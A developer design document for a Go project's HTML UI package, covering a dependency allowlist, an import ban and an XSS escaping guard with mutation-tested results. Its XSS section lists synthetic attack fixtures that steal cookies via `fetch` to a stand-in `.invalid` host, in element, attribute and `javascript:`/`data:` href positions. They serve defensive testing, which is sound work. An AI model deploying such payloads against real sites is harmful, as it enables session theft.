# `internal/ui` — the browser surface, and the dependency policy that came with it

Read on demand. `AGENTS.md` carries the binding claim in three lines and points here for
everything below.

## What Phase A is, and what it deliberately is not

One page, one authentication chain, one rendering path — enough to prove the wiring, the
rendering, and the gate. `cmd/cairn-ui` is **deployed by nothing**: no image wraps it,
`apps` has no entry for it, and `packages.default` does not point at it. It is built by
name (`nix build .#cairn-ui`) or not at all.

There is **no sign-in**, **no cookie session**, **no share flow** and none of the nine
screens. Those are later phases with their own decisions. What exists is:

| route | what |
|---|---|
| `GET /` | the page, over the scopes this credential may read |
| `GET /healthz` | **not in the ledger** — answered before the chain runs, says only `ok` |

🔴 **There was a second row and it was deleted, because it told an authorised operator
the opposite of the truth.** `GET /` rendered the page *with no store read* and
`GET /entries` did the work. `Page` emits *"No scope is visible to this credential.
That is an authority answer, not an empty store."* for any empty scope slice — and the
handler behind `GET /` handed it `nil` without ever calling `Source.Visible`, so a
credential with authority over every scope was told it had none, in the one sentence
written to distinguish those two cases. One page needs one route, and the route that
renders it asks. `TestEveryContentRouteConsultsTheAuthority` walks the ledger and
requires every declared route to consult the authority before rendering; it is a
regression test, not an invariant guard — measured RED on the pre-change dispatch
table with the message *"GET / rendered a page WITHOUT consulting the authority"*.

Authentication is a bearer token against the same `internal/control` projection the pod
resolves against. That is enough to exercise the chain without building the session flow,
and it is the reason the identity pin below is meaningful rather than notional.

## 🔴 The first third-party dependency, and the guarantee it removed

🔴 **The canonical statement of what was lost and what replaced it is
`internal/depspolicy`'s package doc, and it is not repeated here.** That paragraph stood in
`go.mod`, `flake.nix`, `internal/ui/doc.go`, this file, `AGENTS.md` and the package doc
itself — six sites; the package doc is now the only one that states it, and the other five
point. Read it there, including the two things this section used to under-claim and
over-claim respectively:

- the replacement is stronger than "a test instead of a build failure" sounds — all three
  Go derivations run these tests in `doCheck`, so an import-ban failure **is** a build
  failure for anyone building through nix;
- and it is weaker in one way no phrasing removes — a build refusal cannot be satisfied by
  deleting a file, and this one can. The `ok` floor in the `go` CI job is what notices a
  package's tests disappearing, and it does not notice one function disappearing.

**Both halves measured, on this tree:**

| tree | `nix build .#cairn-go` | `ok` lines in its check phase | the `go` job's floor (`-lt 17`) |
|---|---|---|---|
| unmutated | rc 0 | 17 | GREEN at 17 |
| `internal/report` given `_ "maragu.dev/gomponents"` | **rc 1**, `THE IMPORT BAN FAILED for …/cmd/cairn: … internal/report -> maragu.dev/gomponents` | — | — |
| the same import, **and `depspolicy_test.go` deleted** | **rc 0** — the HTML library is linked into the installed CLI and nix builds it | 16 | **RED at 16** |

The third row is the whole weakness in one line: the policy is deletable where
`vendorHash = null` was not, and the only mechanism that observes the deletion is a
package count in one CI job.

`internal/ui` renders HTML with `maragu.dev/gomponents`. There is **one** module, so the
requirement is carried by the pod's and the CLI's derivations too, and all three now pass a
real `vendorHash`. That cost was accepted explicitly — a second module for the UI would
split `internal/` in two and put a version skew between the renderer the pod links and the
one the CLI links, which is the exact failure `internal/report` being ONE package exists to
prevent.

What follows is the evidence for each part: the comparisons, the controls, and the mutants
each was watched to fail on. Records of rounds, which is why they are here and not in a
source comment.

### (i) The module allowlist — `TestTheModuleSetIsExactlyTheAllowlist`

`depspolicy.DeclaredModules` is the whole permitted set. The test reads the set the
repository actually carries — parsing `go.mod`'s `require` directives and `go.sum`'s hash
lines with two independent readers — and compares three ways:

- `go.sum` against `go.mod`, which catches the two lock files being edited apart;
- **GROWN**: a required module the allowlist does not name;
- **SHRANK**: an allowlist entry with no module behind it.

Each direction has its **own message**. A single `reflect.DeepEqual` fails in both
directions and says only "not equal", which is the same defect one level up: the reader
cannot tell which way the set moved, and the natural fix is to edit the allowlist to
match — which is exactly what the guard exists to stop somebody doing without deciding.

The instrument is validated before its verdict is read: an empty allowlist and an empty
measured set both `t.Fatal`, because two empty sets compare equal and a parser wired to
nothing produces one of them.

**Proven red, both directions, each mutant confirmed to BUILD first:**

| mutant | build | result |
|---|---|---|
| `go get golang.org/x/text` (a real, resolvable extra module) | rc 0 | `THE MODULE SET GREW: 1 module(s) are required that the allowlist does not name: [golang.org/x/text]` — and nothing else fired |
| an allowlist entry for a module nothing requires | rc 0 | `THE MODULE SET SHRANK: the allowlist names 1 module(s) go.mod does not require: […]` — and nothing else fired |

### 🔴 There is no `go mod verify` step, and the deletion is the finding

A `go mod verify` step stood in the `go` job as "part (ii)", under a long block of
comment arguing what it did and did not catch. **It verified the empty set.** `cache: false` on
that job's `actions/setup-go` means it starts with no module cache, `go mod verify` does
not download, and it stood ahead of the `go vet` step — so it ran against a cache nothing
had yet populated and printed the identical success line over zero modules. Measured on go1.26.7 against isolated
`GOMODCACHE`s, `rc` captured before any pipe:

| state | rc | stdout | modules extracted in the cache |
|---|---|---|---|
| **cold — the state CI actually ran it in** | **0** | `all modules verified` | **0** |
| populated (positive control) | 0 | `all modules verified` | 1 |
| populated + a line appended inside the module dir (negative control) | **1** | `maragu.dev/gomponents v1.3.0: dir has been modified` | 1 |

Moving it below `go test` would not have rescued it. The only hazard it can see is a cache
modified **after** its fetch; this job fetches into a cache no earlier step restored, and
nothing between the fetch and the check writes to it. In its new position it would be
green-by-construction too — a gate nobody can fail.

It also never gated the hazard its name suggests. With `go.sum`'s `h1:` line corrupted it
exits **0** with `all modules verified` in **both** cache states. What refuses that tree is
the build, which the `go vet` and `go test` steps already run (measured with
`go build ./...` over an isolated cache; whether a `nix build` refuses it with the same
words is **not** measured):

| tamper | `go mod verify` | `go build ./...` |
|---|---|---|
| a character changed in `go.sum`'s `h1:` line | **rc 0**, `all modules verified` (cold **and** populated) | **rc 1**, `verifying maragu.dev/gomponents@v1.3.0: checksum mismatch` → `SECURITY ERROR / This download does NOT match an earlier download recorded in go.sum` |

`TestGoModVerifyPassesIsNotThisSuitesJob` went with it. Its docstring claimed it kept the
step from becoming a gate over an empty set; its body asserted that **`go.sum` names ≥1
module**, which is the wrong quantity — a non-empty `go.sum` does not make the module cache
non-empty, and the cold cache above is the proof. A guard whose description is wider than
its body reads as coverage while providing none, which is worse than none.

### (ii) 🔴 The import ban — the one that keeps the pod clean

`TestNoPackageTheCLIOrThePodLINKSReachesAThirdPartyModule` builds the import graph of
every package under `cmd/` and `internal/` with `go/build` — **parsed, not grepped**, so
an import behind an alias is seen and a module name in a comment is not — computes the
transitive closure out of `cmd/cairn` and `cmd/cairn-server`, and refuses any third-party
import edge inside either.

The allowlist alone cannot do this job: an allowlist of one entry is satisfied by a tree
in which `internal/api` imports that entry on every route.

Three controls run before its verdict is read:

1. **Positive control** — `cmd/cairn-ui`'s closure MUST contain a third-party edge. A walk
   that cannot see the one dependency this repository has cannot vouch for the absence of
   any other, so a zero there withholds the result rather than reporting it clean.
2. **Depth control** — each root's closure must contain a module-internal package that is
   not one of that root's own imports. It is *computed*, not a named package: the first
   draft named `internal/store`, which `cmd/cairn-server` imports **directly**, so the
   control would have been satisfied by exactly the depth-1 walk it existed to refuse.
3. **Platform control** — `go/build`'s default context evaluates `//go:build` lines for the
   current `GOOS`/`GOARCH`, so an import reached only on another platform would be
   invisible. `TestTheImportGraphDoesNotDependOnTheBuILDPLATFORM` re-walks with constraint
   evaluation disabled and requires the same import set. If it ever fails, the ban has a
   hole and the ban is what needs widening.

Test-only imports are excluded from the graph: a `_test.go` file is compiled into a test
binary and never into the program, so counting it would refuse a test that imports a
third-party assertion library — a refusal about nothing, which is how a gate gets deleted.

**Measured on this tree, reported as a pair and never as a bare zero:**

| root | packages in closure | third-party edges |
|---|---|---|
| `cmd/cairn` | 32 | **0** |
| `cmd/cairn-server` | 56 | **0** |
| `cmd/cairn-ui` (positive control) | 52 | **3** |

**Proven red:**

| mutant | build | result |
|---|---|---|
| `internal/report` gains `_ "maragu.dev/gomponents"` | rc 0 | `THE IMPORT BAN FAILED for …/cmd/cairn` **and** `…/cmd/cairn-server`, each naming the edge `internal/report -> maragu.dev/gomponents` |
| `UIBinaryRoot` repointed at a clean binary | rc 0 | `POSITIVE CONTROL FAILED: …/cmd/cairn reaches NO third-party import` |
| `Closure` stops descending after depth 1 | rc 0 | `DEPTH CONTROL FAILED: every module-internal package in …/cmd/cairn's closure is one of its OWN imports` |

**And the claim measured on the artefacts themselves**, which is what the ban is a proxy
for — `go tool nm` over the three binaries: `cairn` **0** gomponents symbols,
`cairn-server` **0**, `cairn-ui` **75**; and `go version -m` records
`dep maragu.dev/gomponents v1.3.0` in `cairn-ui` alone.

### (iii) The prose

`go.mod`'s header and `flake.nix`'s `vendorHash` comment both **stated** the old
guarantee. Both now quote the sentence they replaced rather than deleting it, so a
maintainer who remembers the property is told where it went instead of inferring that
nothing took its place — and both then **point** at `internal/depspolicy`'s package doc
rather than restating what replaced it. That restatement stood in six places at once;
`one rule, one place` applies to prose that is a claim, and six copies of a claim are six
chances for five of them to go stale while still reading as authoritative.

⚠ A vendor hash is **not** a dependency gate and must not be read as one. It pins the
bytes of whatever the module graph resolves to; it says nothing about which modules are in
that graph, and adding one just changes the hash.

## 🔴 The XSS guard

This is the first surface in cairn's history that renders arbitrary user text into HTML.

**Measured against gomponents v1.3.0's own source, not assumed:** `Text`/`Textf` and the
*value* half of `Attr` all run `template.HTMLEscapeString`, so text content and a quoted
attribute value are safe against breakout. Two things are **not** covered, and both are
reachable here:

- **A URL scheme.** `html/template` rewrites a `javascript:` href to `#ZgotmplZ`;
  gomponents writes it through unchanged, because `template.HTMLEscapeString` has nothing
  to say about a scheme — every character of `javascript:alert(1)` survives escaping
  intact. A store entry's `tasks:` ref is `<system>:<id>`, which is *exactly* the shape of
  a scheme plus an opaque part, so this is reachable input and not a constructed one.
- **An element or attribute NAME.** `El` and the name half of `Attr` are written verbatim,
  so a name built from user text is a breakout the value escaping structurally cannot see.

Three mechanisms answer those, and each is checked by a test rather than asked for by a
comment.

### `safeHref` allowlists schemes

`http://` and `https://`, and nothing else. A denylist is the wrong shape: the set of
schemes a browser will execute is open, so a list of the ones to refuse is wrong the
moment it is written. A ref that does not pass renders as **plain text** — visible, inert,
and not silently dropped; dropping it would hide a fact the file carries, and
`<a href="">` would put a clickable element on the page whose target the reader cannot see.

⚠ **The case-fold and the whitespace strip protect the PERMIT side, not the refuse side**,
and an earlier comment here said the opposite. Measured with mutants: deleting the
`ToLower` makes `HTTPS://tracker.invalid/…` be **refused** and changes nothing about
`JaVaScRiPt:`, which an allowlist rejects at any casing. Deleting the strip refuses
`  https://…`. Neither is what stops the script-scheme attack — the allowlist is. What
they buy is that a correctly-spelled URL is not silently demoted to plain text, and that
the value written into the href is the stripped one, so what the page shows and what the
browser resolves are the same string.

### The raw-node ban — `TestNoRawNodeConstructorAppearsInTheUIPackage`

An AST scan, not a grep: it resolves each file's **import alias** for the gomponents
module and matches selector expressions against it, so `g.Raw` is seen (a text search for
`gomponents.Raw` finds nothing that exists) and an unrelated method named `Raw` is not.

It refuses `Raw`, `Rawf`, a dot-import of the module, and `El`/`Attr` called with a
non-constant name argument. It covers `_test.go` files too — a test that renders with
`g.Raw` and asserts a comfortable output is exactly how a rendering guard gets walked.

It reports a pair: the number of gomponents calls it **inspected** must be non-zero, or a
scanner that resolved no alias reports a clean zero indistinguishable from a pass. On this
tree: 9 files scanned, 48 calls inspected, 0 findings.

⚠ **One conservative gap, stated rather than hidden:** a bare identifier is accepted as a
name argument without proving it is a `const`, because proving that needs the type checker
and this ban runs without one. So `g.Attr(someVariable, v)` is **not** caught. What is
caught is every shape that could carry user text directly — a call, an index, a selector,
a conversion — which is where such a name actually comes from.

**Proven red — six mutant shapes, each asserted to fail with its OWN message**, because a
mutant killed by a different arm proves the scanner can produce output and proves nothing
about the rule the arm exists for: `g.Raw`, `g.Rawf`, `gom.Raw` (a different alias),
`g.El(e.Ref)`, `g.Attr(e.Ref, …)`, and a dot-import. Plus the mirror: a clean source using
`g.Attr(refAttr, …)`, `g.El("span", …)` and `g.Textf` must produce **zero** findings, or
the ban refuses all rendering rather than unescaped rendering.

### The rendering test — `TestHostileEntryTextIsEscaped`

**Realistic hostile fixtures, not textbook ones.** `<script>alert(1)</script>` is what
every escaper's own test suite already covers, and it exercises exactly one context. Each
fixture below breaks out of a **different** position and does something an attacker would
actually want. All are synthetic; `collector.invalid` and `tracker.invalid` are in the
IANA-reserved `.invalid` TLD and resolve nowhere.

| position | input |
|---|---|
| text content | `Rollout notes</span><img src=x onerror="fetch('//collector.invalid/c?'+document.cookie)">` |
| attribute value | `runbook" onmouseover="fetch('//collector.invalid/c?'+document.cookie)" data-x="` |
| unclosed tag | `<div style="position:fixed;inset:0;z-index:2147483647;background:#fff" onclick="` |
| href | `javascript:fetch('//collector.invalid/c?'+document.cookie)` |
| href, case-varied + tab | `\t JaVaScRiPt:void(document.title=document.cookie)` |
| href | `data:text/html;base64,PHNjcmlwdD5mZXRjaCgnLy9jb2xsZWN0b3IuaW52YWxpZC8nKTwvc2NyaXB0Pg==` |
| a scope heading | `platform</h2><script src="//collector.invalid/x.js"></script><h2>` |

The entry's ref is rendered into **both** a `title` attribute and text content, so both of
gomponents' escaping paths are exercised rather than one.

Three assertions, in increasing strength:

1. **A structural differential.** A benign world of the *same shape* — one scope, one
   entry, one alias, three refused refs and one link — must produce a page with an
   identical markup shape: the counts of `<`, `>` and `="`. Escaping's whole claim is that
   the page's shape does not depend on its content, and this needs no list of attack
   strings, so it is blind to nothing a future payload invents. Measured: hostile
   `{lt:49 gt:49 eqQuote:17}` == benign `{lt:49 gt:49 eqQuote:17}`.
2. **A token scan**, over four substrings this renderer never emits: `<img`, `<script`,
   `href="javascript:`, `href="data:`. The positive control feeds it the raw fixtures and
   requires the count to move — reported as the pair `4 in the raw fixtures, 0 in the
   rendered page`, never as the zero alone.
   ⚠ An earlier draft of this list also held `onerror=`, `onmouseover=`, `</span>` and
   `</h2>`, and **every one of those fired on a correctly escaped page**: `</span>` and
   `</h2>` are the page's own structure, and `onerror=&#34;…` is the escaped, inert
   rendition — `=` is not an escapable character, so a substring test cannot tell live
   markup from escaped text. A guard that fires on a safe page is a guard that gets
   deleted.
3. **The whole normalised escaped string**, pinned as a literal for four of the fixtures —
   a guard on *words* is walkable by rewording. The literals are hand-written from the HTML
   escaping rules rather than produced by `template.HTMLEscapeString`, so the expectation
   is not derived from the implementation it tests.

Plus: each refused ref must appear as **text** and must not appear after `href="`; and the
one benign `https://` ref **must** render as a link, or every "no `href=javascript`"
assertion above is satisfied by a page with no links at all.

**Proven red:**

| mutant | build | result |
|---|---|---|
| the entry title renders through `g.Raw` | rc 0 | the structural differential moves to `{lt:51 gt:51 eqQuote:18}`, `<img` appears once, the escaped-literal pin misses — **and** the raw-node ban names `render.go:60: calls g.Raw` |
| `safeHref` returns `(raw, true)` for everything | rc 0 | `href="javascript:` ×2 and `href="data:` ×1 in the page, both refused-ref assertions fire, and `TestSafeHrefAllowlistsSchemes` reports nine specific permits |
| the `ToLower` is deleted | rc 0 | `safeHref refused a permitted URL "HTTPS://tracker.invalid/issue/1"` |
| the whitespace/C0 strip is deleted | rc 0 | `safeHref refused a permitted URL "  https://tracker.invalid/issue/1  "` |

### Response hardening, which is a second barrier and not the guard

`X-Content-Type-Options: nosniff` and a CSP of
`default-src 'none'; style-src 'unsafe-inline'; base-uri 'none'; form-action 'none'` — no
script permitted at all. The stylesheet is a Go constant in `render.go` that no input
reaches, which is what makes `style-src 'unsafe-inline'` buy an attacker nothing. The
escaping is the guard; these are behind it.

## 🔴 `TrustedHeader` is not in this binary's identity chain

`internal/identity/README.md` states the hazard plainly: on a pod that is reachable
directly, that backend lets anyone who can open a socket **be** any user in the control
plane, at that user's full authority, on every route, with the writes attributed to them.
The pod's defence is an operator's explicit proxy-fronted declaration plus a source check
— a property of the **deployment**.

A browser surface cannot carry that trade, because its whole purpose is to be publicly
reachable. So `ui.AuthBackends` takes two backends where `identity.Backends` takes three,
and `cmd/cairn-ui` never calls `identity.FromEnvironment` (which arms the backend from the
environment). The backend is unreachable here by construction rather than refused by
configuration, which is the stronger claim: a configuration refusal can be reconfigured.

⚠ **The signature is the mechanism; the signature alone is not the guard.** Nothing stops
a future caller building an `identity.Chain` literal and appending one.
`TestTheUIChainHasNoTrustedHeaderMember` inspects the chain `AuthBackends` **returns** —
the state, not the spelling — with a live `*identity.TrustedHeader` available to it, and
carries its positive control in the same function: that same value is passed to
`identity.Backends`, where it **must** appear, or the type assertion is broken and its
absence from the UI chain means nothing. Measured: `1 in the identity.Backends control
chain (2 members), 0 in the UI chain (1 members)`.

**Proven red — and the first mutant SURVIVED, which is worth more than the kill:**

| mutant | result |
|---|---|
| `AuthBackends` forwards a `TrustedHeader` built with `Secret: []byte("mutant")` | **SURVIVED.** The secret is 6 bytes against `identity.MinProxySecretBytes = 32`, so `NewTrustedHeader` refused, `trusted` was a nil `*TrustedHeader`, `identity.Backends` skipped it, and the test passed against a mutant that armed **nothing**. A mutant that evaluates to a no-op proves nothing, and it looks exactly like a kill that did not happen. |
| the same, with a 33-byte secret and the construction error surfaced | **KILLED**, with its own message: `THE UI CHAIN CONTAINS 1 *identity.TrustedHeader MEMBER(S)…` |
| the membership check asserts `*SupabaseJWT` instead | **KILLED** on the control arm: `POSITIVE CONTROL FAILED: identity.Backends was handed a live *identity.TrustedHeader and the membership check found none…` |

## The route ledger

`ui.DeclaredRoutes()` derives from the same `routes` map the dispatcher reads — there is
no second copy to disagree with. It is read by **one** guard,
`TestTheRouteLedgerMatchesTheDispatchTable`, which runs in `mkGoUI`'s own check phase, so
`nix build .#cairn-ui` gates it.

🔴 **Three mechanisms pinned this list and two were removed, which is a decision and not
an oversight.** A draft carried the Go test *plus* `checks.go-ui-declares-its-routes`
(running the binary and diffing its `-routes` output against a third hand-written copy)
*plus* a `nix` CI step naming that check — three mechanisms over a **one-row** hand-written
list. The `-routes` flag went with them: its only reader was the check, and a flag with no
caller is the shape this repository refuses elsewhere as exported API with no consumer.

⚠ **The pod's equivalent is kept, and the asymmetry is the reason.** `api.DeclaredRoutes()`
is checked against `tests/conformance/requests.json` — an external corpus saying what the
world expects — and the corpus builder is **Python**, structurally blind to a compiled
binary, so `cairn-server -routes` is a genuinely second instrument in a second environment.
This surface has neither a corpus nor a Python-side gate; printing the list from the binary
restates one claim down a longer path. The strongest available claim here is that the
ledger and the dispatcher read one map and that the expected set is spelled out once by
hand: a grow-or-shrink guard on a hand-written list, not a contract comparison. When a
later phase gives this surface a corpus, the second tier comes back with it.

⚠ **The two ledgers are separate and neither moves the other.** `GET /` here is a page;
`GET /` on the pod is the byte-pinned uniform 401 in
`tests/conformance/golden/root-path.json`. This change touches neither — verified by
content hash against the base commit, not by ancestry:

```
UNCHANGED  internal/api/routes.go                     be64d465830e94d8…
UNCHANGED  tests/conformance/requests.json            7eece95fc6603e83…
UNCHANGED  tests/conformance/golden/root-path.json    8a715a7fbafda493…
```

## What this surface's tests structurally cannot see

- **A real browser.** Every escaping assertion is over rendered bytes. No test here parses
  the output the way a browser's tokenizer does, so a payload that survives HTML escaping
  and is still executed by a real parser quirk would pass. The structural differential is
  the closest thing to a parse and it is a count, not a tree.
- **The `nix` build's check phase pins dimensions.** `mkGoUI`'s `go test ./...` runs in a
  sandbox with no store, no token, no network and no `HOME` with a cache root. Every guard
  here is over in-process fixtures for that reason; nothing in this package has been
  measured against a real store on disk, a real token file, or a real socket.
- **Concurrency.** Nothing runs two requests at the same instant.
- **A revoked credential.** This binary has no SIGHUP reload path, so a revocation takes a
  restart. That is a real operational difference from the pod and not something to assume
  away from the shared `control.Cache` type.
